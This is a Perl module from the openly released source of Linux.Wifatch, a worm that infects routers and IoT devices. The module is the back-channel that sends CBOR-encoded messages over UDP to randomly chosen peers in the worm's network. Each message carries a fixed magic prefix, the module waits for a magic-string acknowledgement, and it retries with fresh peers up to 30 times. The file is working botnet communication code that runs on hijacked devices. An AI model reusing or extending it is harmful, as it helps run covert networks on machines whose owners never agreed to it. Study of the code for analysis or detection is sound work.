#
# This file is part of Linux.Wifatch
#
# Copyright (c) 2013,2014,2015 The White Team <rav7teif@ya.ru>
#
# Linux.Wifatch is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Linux.Wifatch is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Linux.Wifatch. If not, see <http://www.gnu.org/licenses/>.
#

package bn::back;

use bn::crypto;
use bn::log;
use bn::event;

our $MAX_OUTSTANDING      = $bn::SAFE_MODE ? 8 : $bn::LOW_MEMORY ? 64 : 1024;
our $MAX_OUTSTANDING_TYPE = $bn::SAFE_MODE ? 2 : $bn::LOW_MEMORY ? 4  : 128;

our @sndq;
our $peer;
our %count;
our $busy;

sub _snd
{
	my $id  = bn::crypto::rand_bytes 8;
	my $msg = shift @sndq;

	--$count{ $msg->[0] } or delete $count{ $msg->[0] };
	$msg = "Ekaim3eP$id$msg->[1]";

	my ($try, $on, $tw, $nxt);

	$on = bn::event::on port_packet => sub {
		"aeWae1we$id" eq $_[0]    # ack?
			or return;

		--$busy;
		($on, $tw, $nxt) = ();

		_snd() if @sndq;
	};

	$nxt = sub {
		if (++$try <= 30) {
			$tw = EV::timer $try * (13 + rand 4), 0, sub {
				undef $peer;
				$nxt->();
			};
		} else {
			--$busy;
			($on, $tw, $nxt) = ();
		}

		$peer //= do {
			my @bc = eval {unpack "(a6)*", $bn::xx::PL[4]->("nodes")}
				or return;

			my ($host, $port) = unpack "a4 n", $bc[rand @bc];
			$peer = Socket::pack_sockaddr_in $port, $host;
		};

		send $bn::port::UDP, $msg, 0, $peer;
	};

	$nxt->();
}

sub snd
{
	++$count{ $_[0] };
	push @sndq, [$_[0], CBOR::XS::encode_cbor \@_];
	_snd unless $busy++;
}

sub busy($)
{
	$count{ $_[0] } >= $MAX_OUTSTANDING_TYPE
		or @sndq >= $MAX_OUTSTANDING;
}

1

